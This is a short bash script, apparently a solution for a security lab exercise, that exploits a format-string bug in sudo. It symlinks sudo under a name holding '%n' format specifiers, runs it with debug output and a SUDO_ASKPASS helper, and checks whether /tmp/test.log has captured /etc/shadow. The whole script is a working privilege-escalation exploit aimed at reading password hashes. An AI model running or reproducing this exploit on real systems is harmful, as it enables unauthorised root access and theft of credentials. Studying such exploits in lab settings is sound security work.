#!/bin/bash
# must be executed under current directory
aslrflag=$(cat /proc/sys/kernel/randomize_va_space)
echo "--- ASLR flag: "$aslrflag
if [ ! $aslrflag = "2" ]; then
    echo "--- sudo_exploit2.sh expects ASLR enabled. Stop."
    exit 1
fi

cp -f ./test.sh /tmp/test.sh
YOUR_SOLUTION=$(echo -ne "%30\$n%32\$n78901234567890") #fix len=25

ln -s /usr/local/libexec/sudo $YOUR_SOLUTION
env -i SUDO_ASKPASS=/tmp/test.sh ./$YOUR_SOLUTION -D9 -A ls

rm $YOUR_SOLUTION
# rm -f /tmp/test.sh
# rm -f /tmp/test.log
echo "--- check /tmp/test.log to see if it contains content of /etc/shadow"

